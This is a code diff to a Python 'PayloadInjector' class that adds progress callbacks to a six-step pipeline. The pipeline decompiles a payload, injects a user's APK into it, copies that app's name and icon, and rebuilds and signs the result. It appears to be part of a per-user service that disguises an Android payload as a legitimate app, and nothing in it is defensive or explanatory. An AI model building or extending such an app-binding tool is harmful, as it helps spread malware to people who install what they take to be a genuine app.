@@ -65,17 +65,21 @@ class PayloadInjector:
             logger.info(f"✅ Payload cache ready: {cache_dir}")
             return True
 
-    async def inject(self, user_apk_path, output_path, user_id=None, username=None):
+    async def inject(self, user_apk_path, output_path, user_id=None, username=None, progress_callback=None):
         start_time = time.time()
 
         try:
             logger.info(f"🚀 Starting payload injection for user {user_id} ({username})")
 
+            if progress_callback:
+                await progress_callback("⚙️ Decompiling payload...")
             logger.info("📦 Step 1/6: Decompiling payload...")
             decompiled = await self._decompile_payload()
             if not decompiled:
                 return None, "Failed to decompile payload", 0
 
+            if progress_callback:
+                await progress_callback("🔍 Analyzing APK...")
             logger.info("🔍 Step 2/6: Analyzing user APK...")
             app_info = await self._analyze_user_apk(user_apk_path)
             if not app_info:
@@ -83,10 +87,14 @@ class PayloadInjector:
 
             logger.info(f"✅ App: {app_info['name']} ({app_info['size']})")
 
+            if progress_callback:
+                await progress_callback(f"📦 Injecting {app_info['name']}...")
             logger.info("📋 Step 3/6: Injecting user APK...")
             if not await self._inject_plugin_apk(user_apk_path, app_info['package']):
                 return None, "Failed to inject plugin.apk", int(time.time() - start_time)
 
+            if progress_callback:
+                await progress_callback("⚙️ Configuring...")
             logger.info("⚙️ Step 4/6: Updating config...")
             if not await self._update_config_js(app_info['name'], app_info['size']):
                 return None, "Failed to update config.js", int(time.time() - start_time)
@@ -95,10 +103,14 @@ class PayloadInjector:
             if not await self._update_payload_app_name(app_info['name']):
                 logger.warning("Failed to update payload app name, continuing...")
 
+            if progress_callback:
+                await progress_callback("🎨 Applying icon...")
             logger.info("🎨 Step 5/6: Updating icon...")
             if app_info['icon_path']:
                 await self._inject_icon(app_info['icon_path'])
 
+            if progress_callback:
+                await progress_callback("🔨 Building & signing...")
             logger.info("🔨 Step 6/6: Building final APK...")
             final_apk = await self._rebuild_and_sign(output_path)
             if not final_apk:
